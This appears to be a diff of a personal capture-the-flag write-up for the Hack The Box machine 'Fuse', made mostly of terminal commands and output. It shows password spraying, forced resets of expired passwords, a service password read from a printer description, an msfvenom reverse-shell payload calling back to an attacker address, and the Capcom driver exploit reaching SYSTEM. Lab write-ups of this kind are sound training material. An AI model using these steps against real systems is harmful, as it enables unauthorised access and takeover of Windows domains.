@@ -1,4 +1,5 @@
-└─$ nmap -p- -sSCV 10.10.10.193  --min-rate 999       
+`└─$ nmap -p- -sSCV 10.10.10.193  --min-rate 999 `
+```
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-16 00:54 AEDT
 Nmap scan report for 10.10.10.193
 Host is up (0.078s latency).
@@ -54,31 +55,36 @@ Host script results:
 | smb2-time: 
 |   date: 2026-01-15T07:11:37
 |_  start_date: 2026-01-15T06:07:46
+```
 
-
-
+#### for port 80
+add hosts, view a page of printer papercut
 http://fuse.fabricorp.local/papercut/logs/html/index.htm
 
 2020-05-30 17:07:06,sthompson,1,1,HP-MFT01,"Fabricorp01.docx - Word",LONWK019,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,153kb,
 
 and some names: pmerton tlavel sthompson bhult administrator , put them in file users
-
-└─$ netexec smb 10.10.10.193 -u users -p 'Fabricorp01'
+guest it is a password leakage, passwd spray using nxc
+`└─$ netexec smb 10.10.10.193 -u users -p 'Fabricorp01'`
+```
 SMB         10.10.10.193    445    FUSE             [*] Windows 10 / Server 2016 Build 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
 SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\pmerton:Fabricorp01 STATUS_LOGON_FAILURE
 SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
 SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\sthompson:Fabricorp01 STATUS_LOGON_FAILURE
 SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
 SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\administrator:Fabricorp01 STATUS_LOGON_FAILURE
-
+```
 for bhult, shows passwd must change 
-└─$ python3 ~/Downloads/smbpasswd.py fabricorp.local/bhult:'Fabricorp01'@fabricorp.local -newpass Fabricorp02
+`└─$ python3 ~/Downloads/smbpasswd.py fabricorp.local/bhult:'Fabricorp01'@fabricorp.local -newpass Fabricorp02`
+```
 Impacket v0.9.13.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [!] Password is expired, trying to bind with a null session.
 [*] Password was changed successfully.
+```
 
-└─$ netexec smb 10.10.10.193 -u bhult -p 'Fabricorp02' --shares                            
+`└─$ netexec smb 10.10.10.193 -u bhult -p 'Fabricorp02' --shares      `
+```
 SMB         10.10.10.193    445    FUSE             [*] Windows 10 / Server 2016 Build 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
 SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\bhult:Fabricorp02 
 SMB         10.10.10.193    445    FUSE             [*] Enumerated shares
@@ -91,15 +97,18 @@ SMB         10.10.10.193    445    FUSE             IPC$            READ        
 SMB         10.10.10.193    445    FUSE             NETLOGON        READ            Logon server share 
 SMB         10.10.10.193    445    FUSE             print$          READ            Printer Drivers
 SMB         10.10.10.193    445    FUSE             SYSVOL          READ            Logon server share 
-
-└─$ python3 ~/Downloads/smbpasswd.py fabricorp.local/bhult:'Fabricorp01'@fabricorp.local -newpass Fabricorp0212345678
+```
+but no useful info except get a printer name.
+`└─$ python3 ~/Downloads/smbpasswd.py fabricorp.local/bhult:'Fabricorp01'@fabricorp.local -newpass Fabricorp0212345678`
+```
 Impacket v0.9.13.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [!] Password is expired, trying to bind with a null session.
 [*] Password was changed successfully.
-                                                                                                              
-┌──(ed㉿kali)-[/tmp/fuse]
-└─$ rpcclient -U bhult%Fabricorp0212345678 10.10.10.193
+```                                                                                                              
+#### Enum RPC
+`└─$ rpcclient -U bhult%Fabricorp0212345678 10.10.10.193`
+```
 rpcclient $> querydispinfo
 index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
 index: 0x109c RID: 0x1db2 acb: 0x00000210 Account: astein	Name: (null)	Desc: (null)
@@ -122,9 +131,10 @@ rpcclient $> enumprinters
 	name:[\\10.10.10.193\HP-MFT01]
 	description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
 	comment:[]
-
-scan2docs password: $fab@s3Rv1ce$1
-
+```
+from printer info, get scan2docs password: $fab@s3Rv1ce$1
+after some data extraction, get a user list
+```
 └─$ cat a | cut -d ":" -f5
 
 └─$ cat b | cut -d"N" -f1 > c    
@@ -146,8 +156,10 @@ scan2docs password: $fab@s3Rv1ce$1
  svc-print	
  svc-scan	
  tlavel	
-
- └─$ crackmapexec smb 10.10.10.193 -u c -p '$fab@s3Rv1ce$1' --continue-on-success
+```
+validate names of list
+` └─$ crackmapexec smb 10.10.10.193 -u c -p '$fab@s3Rv1ce$1' --continue-on-success`
+```
 /usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\ '
   formatter_class=RawTextHelpFormatter)
 [*] First time use detected
@@ -167,9 +179,9 @@ SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\sthompso
 SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 
 SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-scan:$fab@s3Rv1ce$1 
 SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
-
-└─$ netexec smb 10.10.10.193 -u  -p 'Mr.Teddy' --shares 
-                                                                                                              
+```
+no new things from smb
+```                                                                                                              
 ┌──(ed㉿kali)-[/tmp]
 └─$ netexec smb 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1' --shares          
 SMB         10.10.10.193    445    FUSE             [*] Windows 10 / Server 2016 Build 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
@@ -184,10 +196,10 @@ SMB         10.10.10.193    445    FUSE             IPC$            READ        
 SMB         10.10.10.193    445    FUSE             NETLOGON        READ            Logon server share 
 SMB         10.10.10.193    445    FUSE             print$          READ            Printer Drivers
 SMB         10.10.10.193    445    FUSE             SYSVOL          READ            Logon server share
-
-└─$ evil-winrm -i fabricorp.local -u svc-print -p '$fab@s3Rv1ce$1'
-
-                                        
+```
+we can login with print account, get the user flag
+`└─$ evil-winrm -i fabricorp.local -u svc-print -p '$fab@s3Rv1ce$1'`
+```                                      
 Evil-WinRM shell v3.7
                                         
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
@@ -197,9 +209,11 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\svc-print\Documents> whoami
 fabricorp\svc-print
-
-*Evil-WinRM* PS C:\Users\svc-print\Desktop> whoami /priv
-
+```
+#### ES
+check the privi first
+`*Evil-WinRM* PS C:\Users\svc-print\Desktop> whoami /priv`
+```
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -210,20 +224,20 @@ SeLoadDriverPrivilege         Load and unload device drivers Enabled
 SeShutdownPrivilege           Shut down the system           Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+for SeLoadDriverPrivilege - https://github.com/k4sth4/SeLoadDriverPrivilege
 
-
-https://github.com/k4sth4/SeLoadDriverPrivilege
-
-└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.32 LPORT=8821 -f exe -o rev.exe
+`└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.32 LPORT=8821 -f exe -o rev.exe`
+```
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
 Payload size: 460 bytes
 Final size of exe file: 7168 bytes
 Saved as: rev.exe
-
-follow the MD instructure, upload files into target host
-
+```
+follow the MD instructure, clone the project , upload files into target host
+```
 *Evil-WinRM* PS C:\Users\svc-print\DEsktop> .\ExploitCapcom.exe LOAD C:\Users\svc-print\Desktop\Capcom.sys
 [*] Service Name: xnspepxvpõÏ¹&
 [+] Enabling SeLoadDriverPrivilege
@@ -245,9 +259,10 @@ nt authority\system
 [+] Shellcode was executed
 [+] Token stealing was successful
 [+] Command Executed
+```
 
-
-└─$ nc -nvlp 8821
+`└─$ nc -nvlp 8821`
+```
 listening on [any] 8821 ...
 connect to [10.10.16.32] from (UNKNOWN) [10.129.2.5] 50597
 Microsoft Windows [Version 10.0.14393]
@@ -256,7 +271,12 @@ Microsoft Windows [Version 10.0.14393]
 C:\Users\svc-print\DEsktop>whoami
 whoami
 nt authority\system
+```
 
+#### lesson learned
+- care about all info from web,rpc!!
+- smbpasswd to reset user passwd for smb
+- SeLoadDriverPrivilege to ES
 
 
 
